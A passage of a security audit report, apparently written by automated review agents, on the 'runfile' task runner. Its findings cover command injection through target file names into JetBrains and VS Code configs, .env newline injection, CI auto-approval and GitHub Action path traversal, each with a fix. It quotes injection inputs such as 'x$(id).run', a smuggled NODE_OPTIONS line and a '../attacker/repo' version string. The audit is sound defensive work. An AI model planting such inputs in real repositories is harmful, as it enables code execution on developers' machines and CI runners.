		let mut name = rel.components().map(...).join(":");  // the name is the file name verbatim, no character check
```

**Attack path**

A target's name is its .run file name with `.run` stripped (runfile-discovery). On Linux a file name may contain any byte except '/' and NUL, so an untrusted repo can ship runfiles/'build; touch INJECTED.run' or 'x$(id).run'. `run :generate jetbrains` (a documented, non-executing inspection command that only writes editor config) renders each target into .idea/runConfigurations/Runfile_*.run.xml as <option name="SCRIPT_TEXT" value="run --stdin-args {target}" />. The only escaping on {target} is xml_attr() (cmd_generate.rs:329), which escapes &<>"' for the XML layer but leaves shell metacharacters (; $ ( ) ` | &) intact. JetBrains ShConfigurationType runs SCRIPT_TEXT as a shell command (JetBrains 'Run/Debug Configuration: Shell Script', Script text = 'a single command' run by the shell). When the user later opens the project in a JetBrains IDE and runs the generated configuration, the shell executes `run --stdin-args build; touch INJECTED` -> runs target `build` AND the injected `touch INJECTED`; `x$(id)` triggers command substitution. Confirmed by generating the config: SCRIPT_TEXT value="run --stdin-args build; touch INJECTED" and value="run --stdin-args x$(id)" were written verbatim.

[Also reported by `untrusted-repo`] A target name is its .run file name with the extension stripped, built from the raw path components with no character validation (runfile-discovery walk_runs, lib.rs:468). On Linux a file name may hold any byte but '/' and NUL, including shell metacharacters and spaces. `run :generate jetbrains` writes an IntelliJ ShConfigurationType run configuration whose SCRIPT_TEXT is literally `run --stdin-args <name>` with the name passed through xml_attr only. xml_attr escapes the five XML metacharacters but NOT shell metacharacters, and even if it did, IntelliJ XML-unescapes the attribute before handing SCRIPT_TEXT to a shell. So a repository shipping `runfiles/evil$(id).run` or `runfiles/x; id #.run` yields SCRIPT_TEXT `run --stdin-args evil$(id)` / `run --stdin-args x; id #`. When the developer opens the project in a JetBrains IDE and runs that configuration, the shell performs the command substitution / command separator and executes `id` (or any payload) -- a command the developer never wrote, under a config labelled after a target they believe is benign. The same target name also flows, as a `type:shell` task argument, into the `:generate vscode` tasks.json and the `:generate zed` tasks (reproduced: args `["--stdin-args", "evil$(id)"]`), where VS Code/Zed do not quote a no-space argument -- the same class the editors agent recorded for the live extension.

**Why existing controls don't stop it**

xml_attr handles only the XML attribute layer; there is no shell quoting of the target name inside the SCRIPT_TEXT string, and no allowlist on target-name characters anywhere between discovery and generation. The VS Code and Zed generators are NOT the same hazard: both emit the target as an element of a JSON `args` array (VS Code type:\"shell\" string args are quoted by VS Code's own ShellExecution; Zed spawns command+args without a shell), so a `;`/`$()` name lands as a single literal argument there. Only JetBrains SCRIPT_TEXT is a raw shell string. Execution is double-gated: the user must run `:generate jetbrains` in the untrusted repo and then click Run on the generated configuration -- and running a target is executing the author's code by design. The escalation over that baseline is that the injected code runs in addition to (and independent of) whatever the named target's .run body does, so a repo whose `.run` bodies are benign can still run arbitrary commands via the file name alone.

[Also reported by `untrusted-repo`] xml_attr makes the XML well-formed, so there is no XML-structure injection and no way to add sibling <option> elements; the injection is confined to the SCRIPT_TEXT string, but that string IS a shell script to JetBrains. config_file() sanitizes the FILE NAME to [A-Za-z0-9_] (cmd_generate.rs:359), so the on-disk name is safe, but the SCRIPT_TEXT body is not. There is no allowlist or sanitization of target names between discovery and generation. Requires the user to run `:generate jetbrains` on the untrusted repo and then click Run in the IDE -- so it is not zero-click and the user already chose to generate tasks for this repo; hence low, matching the editors agent's rating for the analogous VS Code ShellExecution path (editors.jsonl). Distinct sink and code path (cmd_generate.rs, CLI) from that finding (the VS Code extension's pure.ts/extension.ts).

**Impact**

Arbitrary shell command execution when the user runs the generated JetBrains configuration, beyond the code the named target itself contains. Persists in .idea/runConfigurations/ and would be shipped to teammates if .idea is committed.

[Also reported by `untrusted-repo`] A generated, persisted JetBrains run configuration (and vscode/zed task) executes arbitrary shell chosen by the repository author rather than the named runfile target, when the developer runs it from the IDE. The payload persists in .idea/ until regenerated. Reproduced on the HEAD debug binary: `run :generate jetbrains --stdout` on a repo with `runfiles/evil$(id).run` and `runfiles/x; id #.run` emitted `<option name="SCRIPT_TEXT" value="run --stdin-args evil$(id)" />` and `value="run --stdin-args x; id #" />` verbatim.

**Fix**

Do not place a target name into a shell command string. For JetBrains, either shell-quote the target in SCRIPT_TEXT (single-quote and escape embedded quotes) or, better, use EXECUTE_SCRIPT_FILE/arguments so the name is an argv element rather than shell text. As defense in depth, reject target names containing shell metacharacters / control characters at discovery (the same hardening the bash-completion finding needs).

[Also reported by `untrusted-repo`] Validate target names at discovery (reject or sanitize names containing anything outside a safe set -- letters, digits, `-`, `_`, `:` for namespaces -- or at least shell/XML/control metacharacters), so a name cannot carry shell syntax into any generator or task shell. Alternatively, in jetbrains_config build SCRIPT_TEXT with the target as a properly single-quoted shell word (and shell-escape it), and in the vscode/zed generators mark the task so the argument is passed without shell re-parsing. Name validation at the source fixes this finding, the bash-completion RCE, the :list escape-injection and the VS Code ShellExecution finding together.

**⚠ Product impact**

*Type:* `behavior`

Generated JetBrains configs for target names containing shell metacharacters would change shape (quoted or argv form). No legitimate target name relies on shell interpretation of its name.

*Safer rollout:* Regenerate configs after upgrading; existing generated files are replaced in place by the next `:generate jetbrains`.

**References**

- https://www.jetbrains.com/help/idea/run-debug-configuration-shell-script.html — JetBrains: Shell Script run config 'Script text' runs a single command via the shell (retrieved 2026-10-03)
- https://cwe.mitre.org/data/definitions/78.html — CWE-78 OS Command Injection (retrieved 2026-10-03)

*Reported independently by 2 agents: cli, untrusted-repo.*

---

#### SA-029: Target names reach VS Code task definitions unescaped: shell metacharacters run in the task shell when `runfile.interactive` is false, and `${command:<id>}` in a file name runs a VS Code command on Run

**Severity:** Low | **Confidence:** Confirmed | **Category:** injection | **CWE-78** | **Component:** `editors/vscode`

**Location**

`editors/vscode/src/extension.ts:314-318`

```typescript
const args = ["--stdin-args", ...(dir ? ["--dir", dir] : []), name]

const execution = isInteractive()
	? new vscode.CustomExecution(async () => new RunfileInteractivePty("run", args, cwd))
	: new vscode.ShellExecution("run", args, { cwd })
```

`editors/vscode/src/pure.ts:62-79`

```typescript
export function targetNameFor(filePath: string): string | undefined {
	const parts = filePath.split(/[\\/]/);
...
	return [...rest, stem].join(":");
```

`crates/runfile-discovery/src/lib.rs:468-473`

```rust
let rel = p.strip_prefix(root).unwrap_or(&p).with_extension("");
let mut name = rel
	.components()
	.map(|c| c.as_os_str().to_string_lossy())
	.collect::<Vec<_>>()
	.join(":");
```

`editors/vscode/src/extension.ts:314-324`

```typescript
const args = ["--stdin-args", ...(dir ? ["--dir", dir] : []), name]

const execution = isInteractive()
	? new vscode.CustomExecution(async () => new RunfileInteractivePty("run", args, cwd))
	: new vscode.ShellExecution("run", args, { cwd })

const definition: RunfileTaskDefinition = { type: TASK_TYPE, task: name }
if (dir) {
	definition.dir = dir
}
const task = new vscode.Task(definition, scope, `run ${name}`, TASK_TYPE, execution)
```

`editors/vscode/src/codeLens.ts:53-64`

```typescript
const name = targetNameFor(doc.uri.fsPath);
const anchor = anchorFor(doc.uri.fsPath);
...
new vscode.CodeLens(range, {
	title: "$(play) Run",
	command: "runfile.runTargetInFile",
	arguments: [{ name, anchor }],
```

**Attack path**

A repository ships a target file whose name carries shell syntax but no space, e.g. runfiles/a;touch${IFS}X.run or runfiles/c$(cmd).run (file names may hold any byte but '/' and NUL on Unix; ; $ ( ) ` & are legal on Windows too). Discovery builds the target name from the raw path components with no character check (lib.rs:468-473), `run :list --json` emits it verbatim (verified: names a;b, c$(true), d`true`, e<newline>f, g&h all listed), and the CodeLens path derives the same name straight from the file path (pure.ts targetNameFor). With runfile.interactive=false the task is a vscode.ShellExecution('run', [..., name]). VS Code's _buildShellCommandLine (terminalTaskSystem.ts) quotes a plain-string arg only when it contains an unquoted space, so the name is pasted raw into the command line given to `bash -c` (or PowerShell/cmd on Windows). The CodeLens task also passes the anchor directory as `--dir <anchor>`, so a directory name in the repository is a second carrier. Reproduced offline with a byte-for-byte copy of VS Code's quoting function and a stub `run`: name `a;touch${IFS}MARKER_semicolon` produced `run --stdin-args a;touch${IFS}MARKER_semicolon` and created the marker; `c$(touch${IFS}MARKER_subst)` did the same via command substitution; a name containing a space is single-quoted, but that is not inert either when the name also holds a quote: VS Code wraps the whole word in '...' without escaping an inner ', so x'$(touch Q1)' y became run --stdin-args 'x'$(touch Q1)' y' and created Q1 (re-verified 2026-10-03 against the current terminalTaskSystem.ts). VS Code also expands ${...} task variables in these args before the shell sees them; that is a separate mechanism, recorded as its own finding.

[Also reported by `editors`] A repository ships a directory runfiles/${command holding a file <id>}.run (no ':' in any path component, so the name is legal on Linux, macOS and Windows; discovery joins the components with ':'). `run :list --json` lists it as the target ${command:<id>} (reproduced with the 1.8.2 binary: {"name": "${command:workbench.action.reloadWindow}", ...}), and the CodeLens derives the same name from the path (targetNameFor). buildTask puts the raw name in the task definition and, with the default runfile.interactive=true, uses a CustomExecution. When the task is run, VS Code's TerminalTaskSystem._collectTaskVariables collects every ${...} in a CustomExecution task's definition (vscode.d.ts: 'Any ${} style variables that were in the task definition will be resolved'), _executeCommand -> _acquireInput -> mainThreadTask resolveVariables sends them to the extension host, whose resolver hands ${command:x} back unchanged (resolveFromMap returns the match when there is no mapping), and the main thread then calls configurationResolverService.resolveWithInteraction, which runs commandService.executeCommand('<id>', <array of the variable strings>). With interactive=false the ShellExecution args are collected and resolved the same way. Most commands return undefined, which makes resolveWithInteraction return undefined, so the task is cancelled: the click runs the VS Code command and the target file's own code never runs. ${input:<id>} would likewise pull an input from the workspace's .vscode/tasks.json, whose command-type inputs carry repository-chosen args (traced in source, not run). Triggered by clicking Run (tree row, inline play button, CodeLens, or picking it in Run Task); listing tasks does not resolve variables.

**Why existing controls don't stop it**

Default runfile.interactive=true uses CustomExecution -> cp.spawn('run', args) with no shell, which is not affected; the issue needs interactive=false, which a user can set or the repository's own .vscode/settings.json can set (the setting declares no scope). The extension is disabled in Restricted Mode (no capabilities.untrustedWorkspaces; VS Code docs), so the workspace must be trusted, and the user must click Run on that target. list.rs quote() escapes JSON correctly, so this is not a JSON-structure problem; the gap is that neither discovery nor the extension constrains names, and the extension relies on VS Code's space-only quoting.

[Also reported by `editors`] Needs a trusted workspace: the extension declares no capabilities.untrustedWorkspaces and is disabled in Restricted Mode, and VS Code does not run tasks there (VS Code Workspace Trust guide, fetched 2026-10-03). Needs the user to click Run on that target, whose label reads `run ${command:...}`. VS Code's variable syntax has no escape, and the extension does not filter names. The command receives an array of strings as its argument, so commands that need structured arguments do nothing useful; commands that take none run as invoked (which of them prompt was not checked). Not reproduced inside VS Code (no VS Code instance driven here); every link is traced in the current VS Code sources listed below.

**Impact**

Command execution in the task shell that happens outside `run` entirely: before the prepare gate, before Host::load's static refusal, regardless of whether the target exists or parses, and not visible in the target file a cautious user reviews before clicking Run. Since clicking Run already executes the target's own code by design, the marginal gain is bypassing review/gates rather than new privilege, hence low.

[Also reported by `editors`] In a trusted workspace, the Run button of a target runs an editor command chosen by the file's name instead of the target -- an action not visible in the file a cautious user reviewed, outside `run`'s prepare gate and static refusal. Clicking Run already executes repository code by design, so the marginal gain is review bypass and access to editor commands, hence low. It differs from the unquoted-name finding in needing no setting change: it fires in the default interactive mode.

**Fix**

Pass every argument as a ShellQuotedString with strong quoting: new vscode.ShellExecution({ value: 'run', quoting: vscode.ShellQuoting.Strong }, args.map(a => ({ value: a, quoting: vscode.ShellQuoting.Strong })), { cwd }) -- or better, use vscode.ProcessExecution('run', args, { cwd }) for the non-interactive path, which needs no shell at all. Independently, consider having discovery refuse target file names containing characters outside a conservative set (control characters at least), since names also flow into shell completion and generated editor task files.

[Also reported by `editors`] Before building a Task, skip any target whose name, or a dir, contains "${" (log one line naming it): `if (name.includes("${") || dir?.includes("${")) { output.appendLine(`skipping target ${JSON.stringify(name)}: VS Code would expand \${...} in it`); return undefined }` in buildTask's callers (entryFor, buildFileTargetTask, resolveRunfileTask) and in RunfileCodeLensProvider.provideCodeLenses. VS Code offers no way to pass a literal ${ through task variable resolution, so filtering is the only extension-side fix. Independently, discovery could refuse target file names outside a conservative character set, which would also close the shell-completion and unquoted-task-name findings.

**Product impact:** none — internal change only.

**References**

- https://raw.githubusercontent.com/microsoft/vscode/main/src/vs/workbench/contrib/tasks/browser/terminalTaskSystem.ts — needsQuotes() only returns true for an unquoted space; quoteIfNecessary() leaves other plain-string args raw; result.join(' '); '-c' added for non-Windows shells (retrieved 2026-10-03)
- https://code.visualstudio.com/api/extension-guides/workspace-trust — Extension without untrustedWorkspaces is disabled in Restricted Mode (retrieved 2026-10-03)
- https://raw.githubusercontent.com/microsoft/vscode/main/src/vscode-dts/vscode.d.ts — CustomExecution: 'Any ${} style variables that were in the task definition will be resolved and passed into the callback as resolvedDefinition' (retrieved 2026-10-03)
- https://raw.githubusercontent.com/microsoft/vscode/main/src/vs/workbench/api/browser/mainThreadTask.ts — resolveVariables: ext host pass, then configurationResolverService.resolveWithInteraction on the partially resolved values (retrieved 2026-10-03)
- https://raw.githubusercontent.com/microsoft/vscode/main/src/vs/workbench/services/configurationResolver/browser/baseConfigurationResolverService.ts — resolveWithInteraction: for a 'command' variable, commandService.executeCommand(commandId, expr.toObject()); 'input' variables read the tasks configuration's inputs (retrieved 2026-10-03)
- https://raw.githubusercontent.com/microsoft/vscode/main/src/vs/workbench/services/configurationResolver/common/variableResolver.ts — resolveFromMap returns the match unchanged when no mapping is supplied, so the ext-host pass leaves ${command:x} for the main thread (retrieved 2026-10-03)

*Reported independently by 2 agents: editors.*

---

#### SA-030: `:env decrypt`, `:env set` (plaintext) and the `decrypt()` function write `KEY=value` with no quoting, so a value holding a newline becomes extra variables and multi-line secrets do not survive the round trip

**Severity:** Low | **Confidence:** Confirmed | **Category:** injection | **CWE-93** | **Component:** `crates/runfile-cli (:env), crates/runfile-lang`

**Location**

`crates/runfile-cli/src/cmd_env/crypt.rs:63-68`

```rust
if runfile_crypto::is_encrypted(val_unquoted) {
	let key_part = &trimmed[..eq_pos];
	match runfile_crypto::decrypt(val_unquoted, &key_hex) {
		Ok(plaintext) => {
			out_lines.push(format!("{key_part}={plaintext}"));
```

`crates/runfile-cli/src/cmd_env/mod.rs:460-485`

```rust
pub(crate) fn set_env_line(content: &str, var: &str, value: &str) -> String {
	...
				*line = format!("{var}={value}");
	...
		lines.push(format!("{var}={value}"));
```

`crates/runfile-lang/src/functions.rs:1943-1962`

```rust
Some((k, val)) if runfile_crypto::is_encrypted(val.trim()) => {
	...
	out.push_str(k);
	out.push('=');
	out.push_str(&plain);
```

**Attack path**

Reproduced: `printf 'first-line\nNODE_OPTIONS=--require ./evil.js\n' | run :env set .env CERT` (encrypted file; the value is read from stdin, which the command recommends for secrets) stores one ciphertext; `run :env decrypt .env plain.out` then writes `CERT=first-line` and `NODE_OPTIONS=--require ./evil.js` as two variables. `run :env set plain.env NOTE --plain < val.txt` does the same directly. Who controls the value: its author -- for an encrypted file, anyone holding the key, and a ciphertext's content is invisible in review, so a variable name (NODE_OPTIONS, LD_PRELOAD, BASH_ENV ...) can be hidden inside one until someone decrypts the file to disk and loads it. Values beginning with a quote or containing ` #` / ` //` are also re-read differently (unquoted or truncated), and a PEM key decrypted this way no longer parses.

**Why existing controls don't stop it**

The runtime's .env-file path keeps a decrypted value whole (no re-parse), so targets that load the encrypted file directly are unaffected; only the tools that write a plaintext file are. The decrypted output is 0600.

**Impact**

Low: decrypted files are corrupted for multi-line values, and a key holder can smuggle an extra variable past review into whatever loads the decrypted file.

**Fix**

Use one serializer for all writers: when a value contains a newline, `"`, `#`, a backslash, or leading/trailing blanks, write it double-quoted with `\n`, `\"` and `\\` escapes (the inverse of parse.rs's unescape_double_quoted). Test parse(serialize(v)) == v over awkward values.

**⚠ Product impact**

*Type:* `behavior`

Decrypted and `:env set --plain` files contain double-quoted values where needed; standard dotenv readers handle the same escapes.

*Safer rollout:* None needed beyond a changelog line.

---

#### SA-031: confirm() prompts are silently auto-approved (and the machine-wide runfiles dir disabled) whenever any of 10 CI env vars is set, including a bare CI on a developer machine

**Severity:** Low | **Confidence:** Confirmed | **Category:** other | **CWE-636** | **Component:** `crates/runfile-cli`

**Location**

`crates/runfile-cli/src/ci_detect.rs:7-31`

```rust
const CI_ENV_VARS: &[&str] = &["CI","GITHUB_ACTIONS","GITLAB_CI","CIRCLECI","TRAVIS","BUILDKITE","JENKINS_URL","TF_BUILD","TEAMCITY_VERSION","BITBUCKET_BUILD_NUMBER"];
pub fn is_ci() -> bool { is_ci_with(|name| std::env::var(name).ok()) }
```

`crates/runfile-cli/src/main.rs:254-254`

```rust
host.assume_yes = flags.assume_yes || ci_detect::is_ci();
```

**Attack path**

ci_detect::is_ci() returns true if any of ten env vars is set to a non-empty value, the first being the de-facto-standard bare `CI`. main.rs:254 sets host.assume_yes = flags.assume_yes || is_ci(). The runner's confirm() built-in is skipped (returns yes without prompting) whenever assume_yes is set. So any invocation in an environment where `CI` (or GITHUB_ACTIONS, etc.) happens to be set auto-approves every confirm() guard, with no -y and regardless of whether stdin is an interactive terminal. `CI=true` is set by essentially every CI system (GitHub Actions sets it by default) and is also commonly exported in local/interactive contexts by developers and tools (e.g. to make react-scripts/npm non-interactive), and some container/devcontainer setups set it. The same is_ci() also disables the machine-wide ~/.runfiles directory (main.rs discovery_home -> None). Confirmed by experiment: a target `if confirm("proceed?") print("PROCEEDED")` printed 'declined/cancelled' with no CI var, but printed PROCEEDED (exit 0) with CI=1 and again with GITHUB_ACTIONS=true, stdin not a tty.

**Why existing controls don't stop it**

This is partly by design: CLAUDE.md states confirm() is 'skipped by -y, in CI, and under --dry-run'. The problem is the breadth and shape of the trigger: a single very common env var (`CI`), present in many non-CI interactive shells, fully disables the only user-facing safety prompt, and does so even when a TTY is attached (where a real CI runner has none). confirm() is the project's one guard before destructive target actions; there is no secondary confirmation. Not reachable by an untrusted repo on its own (it needs the env var to already be set in the user's environment), so this is a safety/footgun rather than a remote vector.

**Impact**

A destructive action guarded by confirm() in a trusted target runs without asking on any machine where a CI-shaped env var is set -- a plausible accident on developer machines and in dev containers. Loss is whatever the guarded action does (delete, overwrite, publish). Also silently changes target resolution by dropping the machine-wide directory.

**Fix**

Narrow the auto-yes trigger. Keep real CI working by also requiring a non-interactive stdin: e.g. `assume_yes = flags.assume_yes || (ci_detect::is_ci() && !std::io::stdin().is_terminal())` -- CI runners have no TTY, so this preserves CI behaviour while restoring prompts on an interactive machine that merely has CI set. Alternatively, print a one-line notice when confirm() is auto-answered because of CI detection, so the bypass is visible.

**⚠ Product impact**

*Type:* `behavior`

In a genuine CI job that both sets a CI var AND has a TTY attached, confirm() would prompt (and block) instead of auto-yes under the suggested fix; this combination is rare on CI runners (they have no TTY). No change for `-y` or for CI without a TTY.

*Safer rollout:* Document the change; `-y` remains the explicit, environment-independent opt-out for scripted runs.

**References**

- https://github.blog/changelog/2020-04-15-github-actions-sets-the-ci-environment-variable-to-true/ — GitHub Actions sets CI=true by default; CI is a de-facto standard also set by many local tools (retrieved 2026-10-03)
- https://cwe.mitre.org/data/definitions/636.html — CWE-636 Not Failing Securely ('Failing Open') (retrieved 2026-10-03)

---

#### SA-032: Setup action puts its `version` input into the download URL unvalidated; dot-segments make it fetch and run an archive from any github.com repository

**Severity:** Low | **Confidence:** Confirmed | **Category:** path-traversal | **CWE-22** | **Component:** `.github/actions/setup/action.yml (consumed by third parties at @v1)`

**Location**

`.github/actions/setup/action.yml:70-105`

```yaml
      env:
        VERSION: ${{ inputs.version }}
...
        if [ "$VERSION" = "latest" ]; then
          url="https://github.com/JoaaoVerona/runfile/releases/latest/download/${archive}"
        else
          url="https://github.com/JoaaoVerona/runfile/releases/download/${VERSION}/${archive}"
        fi
...
        curl -fsSL "$url" -o "$RUNNER_TEMP/$archive"
...
        echo "$install_dir" >> "$GITHUB_PATH"
        "$install_dir/$bin" --version
```

`crates/runfile-cli/src/cmd_update.rs:201-216`

```rust
/// Whether `v` is a safe release-tag string. The install scripts put the
/// version into a URL path ... `/`, `;`, `|`, `$`, backticks — is rejected.
```

**Attack path**

Attacker: anyone who controls the value a consumer workflow passes as `version` (e.g. a workflow that forwards a workflow_dispatch/repository_dispatch input, an issue or PR field, or a value read from a file in a PR). Passing it through `env:` correctly prevents shell injection, but nothing checks its shape. With `version: ../../../../attacker/repo/releases/download/v1`, the URL becomes https://github.com/JoaaoVerona/runfile/releases/download/../../../../attacker/repo/releases/download/v1/runfile-cli-<target>.tar.xz, and curl (without --path-as-is) removes the dot-segments before sending, requesting https://github.com/attacker/repo/releases/download/v1/... . Reproduced locally (curl 8.5.0 against a python http.server in SCRATCH): the request line received was `GET /attacker/repo/releases/download/v1/runfile-cli-x86_64-unknown-linux-musl.tar.xz` and the attacker's file was saved as the archive. The action then unpacks it, puts its `run` on PATH for every later step and executes it (`--version`), in a job that may also hold RUNFILE_PRIVATE_KEYS and other secrets.

**Why existing controls don't stop it**

Inputs reach the script through env:, so there is no shell injection. The host stays github.com, so the attacker needs a public github.com release (free). `run :update` refuses `/` and `..`-bearing versions (is_valid_version_tag), so the CLI path is safe; the action has no equivalent check. Exploitation requires a consumer to wire untrusted data into `version`, which is a meaningful precondition and the reason this is rated low rather than medium.

**Impact**

Arbitrary code execution in the consumer's CI job with its secrets, under a step that looks like it installs a pinned runfile release.

**Fix**

Validate before building the URL, e.g. `case "$VERSION" in latest) ;; v[0-9]*.[0-9]*.[0-9]*|[0-9]*.[0-9]*.[0-9]*) ;; *) echo "invalid version: $VERSION" >&2; exit 1 ;; esac` plus a `[[ $VERSION =~ ^v?[0-9]+\.[0-9]+\.[0-9]+(-[0-9A-Za-z.]+)?$ ]]` check, normalising a bare 1.2.3 to v1.2.3 as `:update` does; and pass `--proto '=https' --path-as-is` to curl. Not breaking for any valid tag.

**⚠ Product impact**

*Type:* `behavior`

A `version` that is not latest or a release tag (e.g. a branch name, `nightly`) is refused with an error instead of producing a 404 or a download from elsewhere. No real release tag is affected.

*Safer rollout:* None needed; the error names the accepted shapes.

**References**

- https://datatracker.ietf.org/doc/html/rfc3986#section-5.2.4 — remove_dot_segments, which curl applies unless --path-as-is (retrieved 2026-10-03)
- https://curl.se/docs/manpage.html#--path-as-is — curl squashes /../ sequences by default (retrieved 2026-10-03)

---

#### SA-033: `:env decrypt <src> <dst>` and `:env set` write plaintext at the default mode and only then chmod 0600, and every `:env` rewrite truncates the file in place rather than writing a temp file and renaming

**Severity:** Low | **Confidence:** Confirmed | **Category:** secrets | **CWE-367** | **Component:** `crates/runfile-cli (:env)`

**Location**

`crates/runfile-cli/src/cmd_env/mod.rs:236-251`

```rust
/// ... The permission is set after the write so a
/// freshly-created file never has a wider-permission window.
pub(crate) fn write_secret_file(path: impl AsRef<Path>, content: &[u8]) -> std::io::Result<()> {
	let path = path.as_ref();
	std::fs::write(path, content)?;
	#[cfg(unix)]
	{ ... std::fs::set_permissions(path, std::fs::Permissions::from_mode(0o600))?; }
```

`crates/runfile-cli/src/cmd_env/crypt.rs:91, 193, 334`

```rust
write_secret_file(path, out_content.as_bytes())   // decrypt output
std::fs::write(output, &out_content)              // encrypt output
std::fs::write(file, &out_content)                // rotate, in place
```

**Attack path**

Local multi-user. strace of `run :env decrypt .env out2.env` under umask 022: `openat("out2.env", O_WRONLY|O_CREAT|O_TRUNC|O_CLOEXEC, 0666) = 6`, `write(6, "DB_PASSWORD=TOPS...")`, `close(6)`, then `chmod("out2.env", 0600)`. Between open and chmod the plaintext file is 0644 (or keeps an existing file's wider mode); another user who can traverse the directory and watches it (inotify) can open it in that window and keep reading through the descriptor, since permission is checked only at open. The comment claims the opposite of what the code does. Separately, std::fs::write truncates first: an ENOSPC/EIO or a kill mid-write in `:env rotate` (in place, after the new key has been stored), `:env set`, or `:env encrypt f f` leaves an empty or partial file; for rotate, the old ciphertexts are gone and only the part already rewritten exists.

**Why existing controls don't stop it**

The chmod does run; the window is short; it only matters where the directory is readable by other users. The partial-write case needs an I/O failure; the file is usually also in git.

**Impact**

Low: a narrow window for another local user to read decrypted secrets; rare loss of an encrypted file's contents.

**Fix**

One helper for all four writers: create a temp file in the destination directory with OpenOptions::new().write(true).create_new(true).mode(0o600) (Unix), write, sync_all, then rename over the destination (on Windows, a replace-existing rename); keep the destination's mode for non-secret rewrites (rotate, encrypt) if desired. Correct the comment.

**⚠ Product impact**

*Type:* `behavior`

A destination that is a symlink is replaced by a regular file instead of being written through.

*Safer rollout:* Resolve the symlink first and write the temp file next to its target if write-through is wanted.

---

#### SA-034: `:env set` writes the value in plaintext, and reports success, into a file holding encrypted values whenever it does not see the public-key header (UTF-8 BOM, or a header kept in another file)

**Severity:** Low | **Confidence:** Confirmed | **Category:** secrets | **CWE-636** | **Component:** `crates/runfile-cli (:env)`

**Location**

`crates/runfile-cli/src/cmd_env/mod.rs:208-224`

```rust
let env_map: HashMap<String, String> = pairs.into_iter().collect();

let final_value = if !plain && env_map.contains_key(runfile_crypto::ENCRYPTION_PUBLIC_KEY_VAR) {
	// File is encrypted — encrypt the value
	...
} else {
	value.to_string()
};

let new_content = set_env_line(&content, var, &final_value);
```

`crates/runfile-env/src/parse.rs:12-18, 33`

```rust
let lines: Vec<&str> = content.lines().collect();
...
let trimmed = line.trim();
...
let key = trimmed[..eq_pos].trim();   // a leading U+FEFF is kept as part of the key
```

**Attack path**

No attacker; a fail-open path. Whether `:env set` encrypts is decided only by `env_map.contains_key("RUNFILE_ENCRYPTION_PUBLIC_KEY")`. Two realistic misses: (1) the file starts with a UTF-8 BOM -- `:env init` writes the header on line 1, and Windows PowerShell 5.1 `Set-Content -Encoding UTF8` (among other Windows tools) writes a BOM -- and parse_env_file does not strip U+FEFF, so the key becomes `\u{FEFF}RUNFILE_ENCRYPTION_PUBLIC_KEY`; (2) a secrets file whose header lives in a file loaded before it, a layout the runtime explicitly supports (runfile-env tests/called.rs `a_public_key_a_callers_file_supplied_decrypts_the_called_targets_file`). Reproduced both: `run :env set bom.env NEW_TOKEN tok_FAKE...` and `run :env set secrets.env NEW_TOKEN tok_FAKE...` each appended the token in plaintext beside existing `encrypted:` values and printed `NEW_TOKEN set in ...`. The runtime then reads the plaintext without complaint, so nothing ever fails.

**Why existing controls don't stop it**

No check for existing `encrypted:` values in the file; no warning; the help text says 'write one value, encrypting by default' and the README 'encrypts on write'. `--plain` exists for deliberate plaintext, so plaintext is never what the user asked for here.

**Impact**

A secret the user asked to encrypt is committed in plaintext, unnoticed. Needs one of the two conditions: low.

**Fix**

Strip a leading BOM in parse_env_file. In cmd_set, when `--plain` is absent and the header is missing, refuse if the file contains any `encrypted:` value (or always refuse unless `--plain` or a new `--key <prefix>` is given), naming the reason.

**⚠ Product impact**

*Type:* `behavior`

`:env set` without `--plain` on a headerless file now errors instead of writing plaintext; BOM-prefixed files now parse their first key correctly at run time too.

*Safer rollout:* Error message names `--plain` and `--key`.

**References**

- https://www.spguides.com/powershell-write-to-file-utf8/ — Windows PowerShell 5.1 Set-Content -Encoding UTF8 writes a BOM (PowerShell 6+ does not) (retrieved 2026-10-03)

---

#### SA-035: Pinned Rust toolchain 1.94.1 is five stable releases behind (1.99.0) and no longer supported; its std is statically linked into every shipped `run` and its Cargo builds every release

**Severity:** Low | **Confidence:** Confirmed | **Category:** supply-chain | **CWE-1104** | **Component:** `rust-toolchain.toml / Cargo.toml rust-version (all release builds, all shipped binaries)`

**Location**

`rust-toolchain.toml:1-4`

```
[toolchain]
channel = "1.94.1"
components = ["clippy", "rustfmt"]
profile = "minimal"
```

`Cargo.toml:10`

```
rust-version = "1.94.1"
```

`.cicd/ci.yml:83-87`

```yaml
run: echo "toolchain=$(sed -n 's/^channel = "\(.*\)"/\1/p' rust-toolchain.toml)-x86_64-pc-windows-msvc" >> "$GITEA_OUTPUT"
```

**Attack path**

Not exploitable today. Rust fixes are released only on the current stable (1.99.0, 2026-09-28, per static.rust-lang.org's stable manifest); 1.94.1 (2026-03-26) receives nothing. Everything in the toolchain that touches the product is frozen at that version: the standard library (process spawning, path and environment handling on Windows, which the runner leans on heavily) is compiled into every release binary, and Cargo downloads and unpacks every crate for every release build. Since 1.94.1 the Rust project has published two Cargo advisories, CVE-2026-5223 (symlinks in crate tarballs from third-party registries; all Cargo before 1.96.0) and CVE-2026-5222 (sparse-registry credential reuse; 1.68 to 1.96), both fixed in 1.96.0 and both limited to third-party registries: this workspace resolves all 214 registry packages from crates.io (Cargo.lock: 214 `registry+https://github.com/rust-lang/crates.io-index` sources, no git or alternate registries, no [patch]/[source] replacement), so neither applies. No standard-library advisory was published between 1.94.1 and today. The finding is the standing exposure: the next std or Cargo fix will not reach the shipped binaries until the pin is bumped by hand, and the pin has not moved since the first public commit (2026-05-02).

**Why existing controls don't stop it**

crates.io-only sources make the two Cargo CVEs inapplicable; 1.94.1 itself contains the tar-crate fix for CVE-2026-33056 (Rust blog, 2026-03-21: 'Rust 1.94.1 ... will update to a patched version of the tar crate'). `run audit`/cargo-audit covers crates, not the toolchain. Nothing (Dependabot, Renovate, CI) watches rust-toolchain.toml.

**Impact**

No current vulnerability. Future std/Cargo security fixes will lag in every distributed binary for as long as the pin is not bumped.

**Fix**

Bump `channel` in rust-toolchain.toml (and `rust-version` in Cargo.toml, if the MSRV should follow) to 1.99.0, run `run check` and `run test`, and add rust-toolchain.toml to whatever bumps dependencies (Renovate's `rust-toolchain` manager does this), or a scheduled CI job that fails when the pin is more than one stable behind. Non-breaking for users; may surface new clippy lints under -D warnings.

**Product impact:** none — internal change only.

**References**

- https://static.rust-lang.org/dist/channel-rust-stable.toml — [pkg.rust] version = "1.99.0 (b940084d7 2026-09-28)" (retrieved 2026-10-03)
- https://blog.rust-lang.org/2026/05/25/cve-2026-5223/ — All versions of Cargo shipped before Rust 1.96.0 are affected; crates.io users are not affected (retrieved 2026-10-03)
